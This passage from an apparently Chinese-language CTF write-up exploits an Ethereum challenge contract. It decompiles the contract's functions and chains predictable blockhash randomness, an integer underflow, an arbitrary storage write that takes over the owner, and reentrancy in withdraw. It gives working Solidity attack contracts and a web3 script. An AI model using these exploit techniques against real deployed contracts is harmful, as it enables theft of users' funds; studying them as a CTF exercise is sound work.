+<figure class="highlight javascript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">transfer</span>(<span class="hljs-params"><span class="hljs-keyword">var</span> arg0, <span class="hljs-keyword">var</span> arg1</span>) <span class="hljs-title">returns</span> (<span class="hljs-params"><span class="hljs-keyword">var</span> r0</span>) </span>&#123;<br>    <span class="hljs-keyword">var</span> var0 = <span class="hljs-number">0x00</span>;<br>    <span class="hljs-keyword">var</span> var1 = <span class="hljs-number">0x11d7</span>;<br>    <span class="hljs-keyword">var</span> var2 = msg.sender;<br>    <span class="hljs-keyword">var</span> var3 = arg0;<br>    <span class="hljs-keyword">var</span> var4 = arg1;<br>    func_126F(var2, var3, var4);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0x01</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure>
+<p>func_126F中是对于转账两账户之间的余额操作，其实就是一个账户余额加上value，另一个账户减去value。</p>
+<figure class="highlight stata"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs stata"><span class="hljs-comment">//argo是from账户， arg1是to账户， arg2是value转账数额</span><br>    function func_126F(<span class="hljs-keyword">var</span> arg0, <span class="hljs-keyword">var</span> arg1, <span class="hljs-keyword">var</span> arg2) &#123;<br>        <span class="hljs-keyword">var</span> var0 = 0x00;<br>        <span class="hljs-keyword">var</span> var1 = var0;<br>        <span class="hljs-keyword">var</span> var2 = 0x00;<br>        <span class="hljs-keyword">var</span> var3 = var2;<br>    <br>        <span class="hljs-keyword">if</span> (arg1 &amp; 0xffffffffffffffffffffffffffffffffffffffff == 0xffffffffffffffffffffffffffffffffffffffff &amp; 0x00) &#123; revert(<span class="hljs-keyword">memory</span>[0x00:0x00]); &#125;<br>    <br>        <span class="hljs-keyword">if</span> (arg2 &lt;= 0x00) &#123; revert(<span class="hljs-keyword">memory</span>[0x00:0x00]); &#125;<br>    <br>        <span class="hljs-keyword">var</span> temp0 = arg0;<br>        <span class="hljs-keyword">memory</span>[0x00:0x20] = temp0 &amp; 0xffffffffffffffffffffffffffffffffffffffff;<br>        <span class="hljs-keyword">memory</span>[0x20:0x40] = 0x04;<br>        <span class="hljs-keyword">var</span> temp1 = storage[keccak256(<span class="hljs-keyword">memory</span>[0x00:0x40])];<br>        var0 = temp1;<br>        <span class="hljs-keyword">var</span> temp2 = arg1;<br>        <span class="hljs-keyword">memory</span>[0x00:0x20] = temp2 &amp; 0xffffffffffffffffffffffffffffffffffffffff;<br>        <span class="hljs-keyword">memory</span>[0x20:0x40] = 0x04;<br>        var1 = storage[keccak256(<span class="hljs-keyword">memory</span>[0x00:0x40])];<br>        <span class="hljs-keyword">var</span> temp3 = arg2;<br>        <span class="hljs-keyword">memory</span>[0x00:0x20] = temp0 &amp; 0xffffffffffffffffffffffffffffffffffffffff;<br>        <span class="hljs-keyword">memory</span>[0x20:0x40] = 0x04;<br>        var2 = storage[keccak256(<span class="hljs-keyword">memory</span>[0x00:0x40])] - temp3;<br>        <span class="hljs-keyword">memory</span>[0x00:0x20] = temp2 &amp; 0xffffffffffffffffffffffffffffffffffffffff;<br>        <span class="hljs-keyword">memory</span>[0x20:0x40] = 0x04;<br>        var3 = storage[keccak256(<span class="hljs-keyword">memory</span>[0x00:0x40])] + temp3;<br>    <br>        <span class="hljs-keyword">if</span> (var0 &lt; temp3) &#123; revert(<span class="hljs-keyword">memory</span>[0x00:0x00]); &#125;<br>    <br>        <span class="hljs-keyword">if</span> (var3 &lt;= var1) &#123; revert(<span class="hljs-keyword">memory</span>[0x00:0x00]); &#125;<br>    <br>        <span class="hljs-keyword">var</span> temp4 = var2;<br>        <span class="hljs-keyword">memory</span>[0x00:0x20] = arg0 &amp; 0xffffffffffffffffffffffffffffffffffffffff;<br>        <span class="hljs-keyword">memory</span>[0x20:0x40] = 0x04;<br>        storage[keccak256(<span class="hljs-keyword">memory</span>[0x00:0x40])] = temp4;<br>        <span class="hljs-keyword">var</span> temp5 = var3;<br>        <span class="hljs-keyword">memory</span>[0x00:0x20] = arg1 &amp; 0xffffffffffffffffffffffffffffffffffffffff;<br>        <span class="hljs-keyword">memory</span>[0x20:0x40] = 0x04;<br>        storage[keccak256(<span class="hljs-keyword">memory</span>[0x00:0x40])] = temp5;<br>    <br>        <span class="hljs-keyword">if</span> (var0 + var1 == temp4 + temp5) &#123; <span class="hljs-keyword">return</span>; &#125;<br>        <span class="hljs-keyword">else</span> &#123; <span class="hljs-keyword">assert</span>(); &#125;<br>    &#125;<br></code></pre></div></td></tr></table></figure>
+<h3 id="0x2e1a7d4d-withdraw-uint256"><a href="#0x2e1a7d4d-withdraw-uint256" class="headerlink" title="0x2e1a7d4d withdraw(uint256)"></a>0x2e1a7d4d withdraw(uint256)</h3><blockquote>
+<p>要求 storage[0x05] == 0x02<br>要求 storage[0x06] == 0x03<br>要求退款每次 &gt;= 100<br>要求 storage[0x04] &lt; arg0，即余额比每次退款要多 即对应        require(balanceOf[msg.sender] &gt;= _amount);<br>要求合约余额比退款要多 即require(address(this).balance &gt;= _amount);<br>满足条件后，storage[0x04] -= arg0 ，然后调用 call 函数进行转账（这里存在重入攻击，因为没有对 gas 做控制），最后 storage[0x05] -= 0x01</p>
+</blockquote>
+<figure class="highlight inform7"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs inform7">function withdraw(var arg0) &#123;<br>    if (msg.sender != storage<span class="hljs-comment">[0x00]</span> &amp; 0xffffffffffffffffffffffffffffffffffffffff) &#123; revert(memory<span class="hljs-comment">[0x00:0x00]</span>); &#125;<br>    <br>    memory<span class="hljs-comment">[0x00:0x20]</span> = msg.sender;<br>    memory<span class="hljs-comment">[0x20:0x40]</span> = 0x05;<br>    <br>    if (storage<span class="hljs-comment">[keccak256(memory<span class="hljs-comment">[0x00:0x40]</span>)]</span> != 0x02) &#123; revert(memory<span class="hljs-comment">[0x00:0x00]</span>); &#125;<br>    <br>    memory<span class="hljs-comment">[0x00:0x20]</span> = msg.sender;<br>    memory<span class="hljs-comment">[0x20:0x40]</span> = 0x06;<br>    <br>    if (storage<span class="hljs-comment">[keccak256(memory<span class="hljs-comment">[0x00:0x40]</span>)]</span> != 0x03) &#123; revert(memory<span class="hljs-comment">[0x00:0x00]</span>); &#125;<br>    <br>    if (arg0 &lt; 0x64) &#123; revert(memory<span class="hljs-comment">[0x00:0x00]</span>); &#125;<br>    <br>    memory<span class="hljs-comment">[0x00:0x20]</span> = msg.sender;<br>    memory<span class="hljs-comment">[0x20:0x40]</span> = 0x04;<br>    <br>    if (storage<span class="hljs-comment">[keccak256(memory<span class="hljs-comment">[0x00:0x40]</span>)]</span> &lt; arg0) &#123; revert(memory<span class="hljs-comment">[0x00:0x00]</span>); &#125;<br>    <br>    if (address(address(this)).balance &lt; arg0) &#123; revert(memory<span class="hljs-comment">[0x00:0x00]</span>); &#125;<br>    <br>    var temp0 = arg0;<br>    memory<span class="hljs-comment">[0x00:0x20]</span> = msg.sender;<br>    memory<span class="hljs-comment">[0x20:0x40]</span> = 0x04;<br>    var temp1 = keccak256(memory<span class="hljs-comment">[0x00:0x40]</span>);<br>    storage<span class="hljs-comment">[temp1]</span> = storage<span class="hljs-comment">[temp1]</span> - temp0;<br>    var temp2 = memory<span class="hljs-comment">[0x40:0x60]</span>;<br>    memory<span class="hljs-comment">[temp2:temp2 + 0x00]</span> = address(msg.sender).call.gas(msg.gas).value(temp0)(memory<span class="hljs-comment">[temp2:temp2 + memory<span class="hljs-comment">[0x40:0x60]</span> - temp2]</span>);<br>    memory<span class="hljs-comment">[0x00:0x20]</span> = msg.sender;<br>    memory<span class="hljs-comment">[0x20:0x40]</span> = 0x05;<br>    var temp3 = keccak256(memory<span class="hljs-comment">[0x00:0x40]</span>);<br>    storage<span class="hljs-comment">[temp3]</span> = storage<span class="hljs-comment">[temp3]</span> - 0x01;<br>&#125;<br></code></pre></div></td></tr></table></figure>
+
+
+
+<h2 id="链子"><a href="#链子" class="headerlink" title="链子"></a>链子</h2><p>分析完函数，太多信息了。。无法连起来看，这里总结一下。</p>
+<p>payforflag函数是我们最终需要调用的函数，但是有三个条件</p>
+<ul>
+<li>一个账户尾数需要0x111，这个有相应网站直接生成</li>
+<li>要求 storage[0x06] == 0x03 ，可以依次调用gift(),buy(),revise()即可</li>
+<li>要求 storage[0x05] &gt; 0x8ac7230489e80000  这个可以重入攻击</li>
+<li>要求 msg.sender == storaget[0x00] 即onlyowner修饰 这个可以覆盖storage[0x00]为msg.sender</li>
+</ul>
+<p>gift函数</p>
+<ul>
+<li>要求 address(msg.sender).code.length == 0，即需要在合约的constructor中调用。 所以说无法重复调用，不然只用这个函数就能随意storage[0x05]，storage[0x06]的值。</li>
+<li>要求 msg.sender 后三个数为 0x111 这个也可以直接生成相应账户</li>
+<li>满足上述条件后，storage[0x04] = 100 ， storage[0x05] += 1 ， storage[0x06] += 1</li>
+</ul>
+<p>guess函数</p>
+<ul>
+<li>首先要求 arg0 == block.blockHash(block.number - 0x01) % 3 ，这个很容易满足，因为利用区块号生成的随机数是可预测的</li>
+<li>满足要求后，将storage[0x00] 的address地址的前一个字节设为1，其实就是bool和address放在一个slot下的情况，这里只改了那个bool值。</li>
+</ul>
+<p>buy函数</p>
+<ul>
+<li>要求 storage[0x06] == 1 ，这些在攻击合约构造函数中调用 gift() 空投可以完成</li>
+<li>要求 storage[0x05] == 1 ，这里同上。</li>
+<li>要求 storage[0x02] == 1 ，结合 func_06CE 来看，只需使得 0xa8286aca 第二次调用返回 1 即可</li>
+<li>要求storage[0x00]的从低位数第21字节 == 0x01（前二十即为一个address），这个同guess函数要求</li>
+</ul>
+<p>满足上述要求后，storage[0x05] += 1 ，storage[0x06] += 1</p>
+<p>revise函数<br>存在漏洞可以覆盖任意storage的值。</p>
+<ul>
+<li>要求 storage[0x05] == 0x02 ，</li>
+<li>要求 storage[0x06] == 0x02 ，</li>
+<li>要求 storage[0x00] / 0x0100 ** 0x14 &amp; 0xff == 0x01 ，即 storage[0x00] 的高 96 位数值要求为 1 ，这个满足 guess 即可</li>
+<li>要求 arg0 &gt;= storage[0x01]<br>满足上述要求后，后面进行了 storage 写操作，这里是任意写操作所以可以覆盖任意storage的值，所以就解决了payforflag的一个要求，可以将storage[0x00]修改为 msg.sender</li>
+</ul>
+<p>func_06CE(arg0)函数</p>
+<ul>
+<li>调用了两次同一个函数0xa8286aca</li>
+<li>第一次调用仅仅就判断了函数的返回值取反之后是满足true还是false，如果通过if判断则会进行第二次调用0xa8286aca函数，并将结果赋值给storage[0x02].</li>
+</ul>
+<p>这里解答一下上面自己的疑问，就是wp里面说到两次返回结果不一样并不是一定不一样的，这是我们自己根据其它函数和攻击链子需要判断出来的这里两次调用函数返回结果需要不一样。首先第一次需要让它返回false，取反之后就是true，然后第二次需要返回true，然后storage[0x02] = true，才能满足调用buy函数的要求。</p>
+<p>所以最终链子就是wp里的</p>
+<blockquote>
+<ul>
+<li><p>生成符合要求的外部账户，在 constructor 中调用 gift()</p>
+</li>
+<li><p>调用 0x23de8635 func_06CE ，这里要利用 bytecode 的方式部署，因为我们不知道 func_06CE 中调用的接口函数 0xa8286aca 的函数名，所以利用 bytecode 的方式部署第三方合约，将 fake(uint256) 对应的函数选择 id 改为 0xa8286aca 即可，这样调用 0xa8286aca 就是调用我们重写之后的 0xa8286aca 了，用 bytecode 部署可以用在线的 <a target="_blank" rel="noopener" href="https://www.myetherwallet.com/">myetherwallet</a></p>
+</li>
+<li><p>调用 guess() ，然后调用 buy()</p>
+</li>
+<li><p>调用 retract() 和 revise() 修改 owner</p>
+</li>
+<li><p>部署第三方子合约，第三方子合约调用 gift() 和 transfer() 给攻击合约转账，然后调用 withdraw() 进行重入攻击</p>
+</li>
+<li><p>最后调用 payforflag 即可</p>
+</li>
+</ul>
+</blockquote>
+<h2 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h2><p>首先生成一个符合要求的用户。<br><img src="https://img-blog.csdnimg.cn/img_convert/6dd26fe6fa3af1e65a6f7c3dcdf5b0c1.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="部署第三方合约，在构造函数中调用gift函数"><a href="#部署第三方合约，在构造函数中调用gift函数" class="headerlink" title="部署第三方合约，在构造函数中调用gift函数"></a>部署第三方合约，在构造函数中调用gift函数</h3><p>然后利用bytecode部署第三方合约,将bytecode中的<code>fake(uint256)</code>函数签名0xc7375737改为0xa8286aca</p>
+<figure class="highlight fortran"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs fortran">pragma solidity ^<span class="hljs-number">0.4</span><span class="hljs-number">.23</span>;<br><br>contract hack &#123;<br>    address instance_address = <span class="hljs-number">0</span>xcCaECd49e4Ea39C536291193E9301dF4d5E0A654;<br>    uint have_withdraw = <span class="hljs-number">0</span>;<br>    <br>    <span class="hljs-built_in">int</span> cnt = <span class="hljs-number">0</span>;<br>    <br>    constructor() payable &#123;<br>        // gift()<br>        address(instance_address).<span class="hljs-keyword">call</span>(bytes4(<span class="hljs-number">0</span>x24b04905));<br>    &#125;<br>    <br>    <span class="hljs-function"><span class="hljs-keyword">function</span></span> step1() <span class="hljs-keyword">public</span> &#123;<br>        // storage[<span class="hljs-number">0</span>x02] == <span class="hljs-number">1</span><br>        address(instance_address).<span class="hljs-keyword">call</span>(bytes4(<span class="hljs-number">0</span>x23de8635), <span class="hljs-number">0</span>);<br>    &#125;<br>    <br>    <span class="hljs-function"><span class="hljs-keyword">function</span></span> fake(uint256 _i) <span class="hljs-keyword">public</span> returns(uint256) &#123;<br>        <span class="hljs-keyword">if</span>(cnt == <span class="hljs-number">1</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>        &#125;<br>        cnt = <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span></span> step2() <span class="hljs-keyword">public</span> &#123;<br>        // guess(uint256)<br>        uint256 v = uint256(<span class="hljs-keyword">block</span>.blockhash(<span class="hljs-keyword">block</span>.<span class="hljs-keyword">number</span>-<span class="hljs-number">1</span>)) % <span class="hljs-number">3</span>;<br>        address(instance_address).<span class="hljs-keyword">call</span>(bytes4(<span class="hljs-number">0</span>x9189fec1), v);<br>        // buy()<br>        address(instance_address).<span class="hljs-keyword">call</span>(bytes4(<span class="hljs-number">0</span>xa6f2ae3a));<br>    &#125;<br>    <br>    <span class="hljs-function"><span class="hljs-keyword">function</span></span> step3() <span class="hljs-keyword">public</span> &#123;<br>        // retract()<br>        assert(address(instance_address).<span class="hljs-keyword">call</span>(bytes4(<span class="hljs-number">0</span>x47f57b32)));<br>    &#125;<br>    <br>    <span class="hljs-function"><span class="hljs-keyword">function</span></span> step4() <span class="hljs-keyword">public</span> &#123;<br>        // revise(uint256,bytes32)<br>        uint256 solt = <span class="hljs-number">2</span>**<span class="hljs-number">256</span>-<span class="hljs-number">0</span>xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6;<br>        address(instance_address).<span class="hljs-keyword">call</span>(bytes4(<span class="hljs-number">0</span>x0339f300), solt, <span class="hljs-number">2</span>**<span class="hljs-number">160</span> + uint256(address(this)));<br>    &#125;<br>    <br>    <span class="hljs-function"><span class="hljs-keyword">function</span></span> step5() <span class="hljs-keyword">public</span> &#123;<br>        // withdraw<br>        address(instance_address).<span class="hljs-keyword">call</span>(bytes4(<span class="hljs-number">0</span>x2e1a7d4d), <span class="hljs-number">100</span>);<br>    &#125;<br>    <br>    <span class="hljs-function"><span class="hljs-keyword">function</span><span class="hljs-params">()</span></span> payable &#123;<br>        <span class="hljs-keyword">if</span> (have_withdraw &lt;=<span class="hljs-number">2</span> &amp;&amp; msg.sender == instance_address) &#123;<br>            have_withdraw += <span class="hljs-number">1</span>;<br>            address(instance_address).<span class="hljs-keyword">call</span>(bytes4(<span class="hljs-number">0</span>x2e1a7d4d), <span class="hljs-number">100</span>);<br>        &#125;<br>    &#125;<br>    <br>    <span class="hljs-function"><span class="hljs-keyword">function</span></span> step6(string b64email) <span class="hljs-keyword">public</span> &#123;<br>        address(instance_address).<span class="hljs-keyword">call</span>(bytes4(<span class="hljs-number">0</span>x6bc344bc), b64email);<br>    &#125;<br>&#125;<br><br>contract son &#123;<br>    address instance_address = <span class="hljs-number">0</span>xcCaECd49e4Ea39C536291193E9301dF4d5E0A654;<br>    <br>    constructor() payable &#123;<br>        // gift()<br>        address(instance_address).<span class="hljs-keyword">call</span>(bytes4(<span class="hljs-number">0</span>x24b04905));<br>        // <span class="hljs-built_in">transfer</span><br>        address(instance_address).<span class="hljs-keyword">call</span>(bytes4(<span class="hljs-number">0</span>xa9059cbb), address(<span class="hljs-number">0</span>xE281b17958fc2a9dc089Cc8c13c09bE787f88111), <span class="hljs-number">100</span>);<br><br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure>
+<p>部署完可以看到合约地址最后十二位为0x111，并且按照上述分析，部署完第三方合约在构造函数会调用gift所以此时storage[0x04]应该为100,storage[0x05]和storage[0x06]都为1<br>利用如下合约验证</p>
+<figure class="highlight reasonml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs reasonml">from eth_abi import abi, encode_abi<br>from  eth_utils import  keccak<br>from <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Crypto</span>.</span><span class="hljs-module"><span class="hljs-identifier">Util</span>.</span></span>number import bytes_to_long<br>from web3 import Web3,HTTPProvider<br>from hexbytes import *<br>def <span class="hljs-built_in">bytes</span><span class="hljs-constructor">Tohex(<span class="hljs-params">data</span>)</span>:<br>   # return hex(<span class="hljs-built_in">bytes</span><span class="hljs-constructor">_to_long(<span class="hljs-params">data</span>)</span>).rjust(<span class="hljs-number">66</span>,<span class="hljs-character">&#x27;0&#x27;</span>)<br>   return hex(<span class="hljs-built_in">bytes</span><span class="hljs-constructor">_to_long(<span class="hljs-params">data</span>)</span>)<br><br>contract_address     = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Web3</span>.</span></span><span class="hljs-keyword">to</span><span class="hljs-constructor">ChecksumAddress(<span class="hljs-string">&quot;0xcCaECd49e4Ea39C536291193E9301dF4d5E0A654&quot;</span>)</span><br><br>rpc = 填写自己账户的rpc<br><br>w3 = <span class="hljs-constructor">Web3(HTTPProvider(<span class="hljs-params">rpc</span>)</span>)<br>print(w3.is<span class="hljs-constructor">Connected()</span>)<br><br># balance = w3.from<span class="hljs-constructor">Wei(<span class="hljs-params">w3</span>.<span class="hljs-params">eth</span>.<span class="hljs-params">getBalance</span>(<span class="hljs-params">wallet_address</span>)</span>, <span class="hljs-string">&quot;ether&quot;</span>)<br># print(balance)<br>slot4 = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Web3</span>.</span></span>keccak(encode<span class="hljs-constructor">_abi([&#x27;<span class="hljs-params">address</span>&#x27;,&#x27;<span class="hljs-params">uint</span>&#x27;], [&#x27;0xE281b17958fc2a9dc089Cc8c13c09bE787f88111&#x27;,0x04])</span>)<br>slot5 = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Web3</span>.</span></span>keccak(encode<span class="hljs-constructor">_abi([&#x27;<span class="hljs-params">address</span>&#x27;,&#x27;<span class="hljs-params">uint</span>&#x27;], [&#x27;0xE281b17958fc2a9dc089Cc8c13c09bE787f88111&#x27;,0x05])</span>)<br>slot6 = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Web3</span>.</span></span>keccak(encode<span class="hljs-constructor">_abi([&#x27;<span class="hljs-params">address</span>&#x27;,&#x27;<span class="hljs-params">uint</span>&#x27;], [&#x27;0xE281b17958fc2a9dc089Cc8c13c09bE787f88111&#x27;,0x06])</span>)<br><br>print(<span class="hljs-string">&quot;storage4 : &quot;</span> + <span class="hljs-built_in">bytes</span><span class="hljs-constructor">Tohex(<span class="hljs-params">w3</span>.<span class="hljs-params">eth</span>.<span class="hljs-params">getStorageAt</span>(<span class="hljs-params">contract_address</span>, <span class="hljs-params">slot4</span>)</span>))<br>print(<span class="hljs-string">&quot;storage5 : &quot;</span> + <span class="hljs-built_in">bytes</span><span class="hljs-constructor">Tohex(<span class="hljs-params">w3</span>.<span class="hljs-params">eth</span>.<span class="hljs-params">getStorageAt</span>(<span class="hljs-params">contract_address</span>, <span class="hljs-params">slot5</span>)</span>))<br>print(<span class="hljs-string">&quot;storage6 : &quot;</span> + <span class="hljs-built_in">bytes</span><span class="hljs-constructor">Tohex(<span class="hljs-params">w3</span>.<span class="hljs-params">eth</span>.<span class="hljs-params">getStorageAt</span>(<span class="hljs-params">contract_address</span>, <span class="hljs-params">slot6</span>)</span>))<br># slot = <span class="hljs-built_in">bytes</span><span class="hljs-constructor">Tohex(<span class="hljs-params">w3</span>.<span class="hljs-params">eth</span>.<span class="hljs-params">getStorageAt</span>(<span class="hljs-params">contract_address</span>, <span class="hljs-params">idx</span>+1)</span>)<br># print(slot)<br># <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>,<span class="hljs-number">7</span>):<br>#     slot = w3.eth.get<span class="hljs-constructor">StorageAt(<span class="hljs-params">contract_address</span>,<span class="hljs-params">i</span>)</span><br>#     print(<span class="hljs-built_in">bytes</span><span class="hljs-constructor">Tohex(<span class="hljs-params">slot</span>)</span>)<br></code></pre></div></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/2fa7d02398f9aba5cb8b3cc5e04cc862.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="step1调用到重写的接口函数"><a href="#step1调用到重写的接口函数" class="headerlink" title="step1调用到重写的接口函数"></a>step1调用到重写的接口函数</h3><p>在上述分析可以知道，接口函数重写需要使两次返回结果不一样，我们让第二次返回true，所以sotrage[0x02]=true<br><img src="https://img-blog.csdnimg.cn/img_convert/426df10f7f4fc885ef2bfef27498d713.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="step2调用guess和buy函数"><a href="#step2调用guess和buy函数" class="headerlink" title="step2调用guess和buy函数"></a>step2调用guess和buy函数</h3><p>可以看到调用完,storage[0x00]相比调用前高位字节多了个0x01，即一个bool型变量被设置成了true。<br><img src="https://img-blog.csdnimg.cn/img_convert/8ff8d61ac9e627867f20180bcb6b8aac.png" srcset="/img/loading.gif" lazyload></p>
+<p>而在buy函数中会使storage[0x05]和storage[0x06]都+1</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/5240cbd9e4194756657ed97a6233a36c.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="step3调用retract函数"><a href="#step3调用retract函数" class="headerlink" title="step3调用retract函数"></a>step3调用retract函数</h3><p>在retract函数中会进行storage[0x01]-1，而在上面可以看到storage[0x01]为0，所以会下溢出。<br><img src="https://img-blog.csdnimg.cn/img_convert/54f308278a2d719066651f8e5ec5a7d8.png" srcset="/img/loading.gif" lazyload></p>
+<p>此时storage[0x01]为0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff<br><img src="https://img-blog.csdnimg.cn/img_convert/a6085331525b96ac027e4da5a6176481.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="step4调用-retract-和-revise-修改-owner"><a href="#step4调用-retract-和-revise-修改-owner" class="headerlink" title="step4调用 retract() 和 revise() 修改 owner"></a>step4调用 retract() 和 revise() 修改 owner</h3><p>调用完storage[0x00]已经被修改<br><img src="https://img-blog.csdnimg.cn/img_convert/56209c9d13d7f04343071f4c707098dd.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="部署第三方子合约，第三方子合约调用-gift-和-transfer-给攻击合约转账"><a href="#部署第三方子合约，第三方子合约调用-gift-和-transfer-给攻击合约转账" class="headerlink" title="部署第三方子合约，第三方子合约调用 gift() 和 transfer() 给攻击合约转账"></a>部署第三方子合约，第三方子合约调用 gift() 和 transfer() 给攻击合约转账</h3><figure class="highlight excel"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs excel"><br>contract son &#123;<br>    <span class="hljs-built_in">address</span> instance_address = <span class="hljs-number">0</span>xcCaECd49e4Ea39C536291193E9301dF4d5E0A654;<br>    <br>    constructor() payable &#123;<br>        // gift()<br>        <span class="hljs-built_in">address</span>(instance_address).<span class="hljs-built_in">call</span>(bytes4(<span class="hljs-number">0</span>x24b04905));<br>        // transfer<br>        <span class="hljs-built_in">address</span>(instance_address).<span class="hljs-built_in">call</span>(bytes4(<span class="hljs-number">0</span>xa9059cbb), <span class="hljs-built_in">address</span>(<span class="hljs-number">0</span>xE281b17958fc2a9dc089Cc8c13c09bE787f88111), <span class="hljs-number">100</span>);<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure>
